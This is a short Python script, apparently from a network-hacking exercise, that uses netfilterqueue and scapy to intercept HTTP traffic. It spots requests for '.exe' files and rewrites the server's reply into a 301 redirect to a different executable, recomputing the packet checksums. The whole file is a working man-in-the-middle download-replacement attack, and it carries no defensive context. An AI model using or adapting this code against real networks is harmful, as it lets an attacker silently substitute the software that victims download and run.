import netfilterqueue
import scapy.all as s

ack_list=[]

def run_packet(packet):
    sp=s.IP(packet.get_payload())
    if sp.haslayer(s.Raw):
        if sp.haslayer(s.TCP):
            if sp[s.TCP].dport==80:
               
                if ".exe" in str(sp[s.Raw].load):
                    print("EXE Request!!!")
                    ack_list.append(sp[s.TCP].ack)
            elif sp[s.TCP].sport==80:
                
                if sp[s.TCP].seq in ack_list:
                    print("HTTP Response!!!")
                    ack_list.remove(sp[s.TCP].seq)
                    sp[s.Raw].load="HTTP/1.1 301 Moved Permanently\nLocation:https://download.winzip.com/gl/gad/winzip26.exe\n\n"
                    del sp[s.IP].len
                    del sp[s.IP].chksum
                    del sp[s.TCP].chksum
                    packet.set_payload(bytes(sp))
        else:
            pass
    packet.accept()

queue=netfilterqueue.NetfilterQueue()
queue.bind(0,run_packet)
queue.run()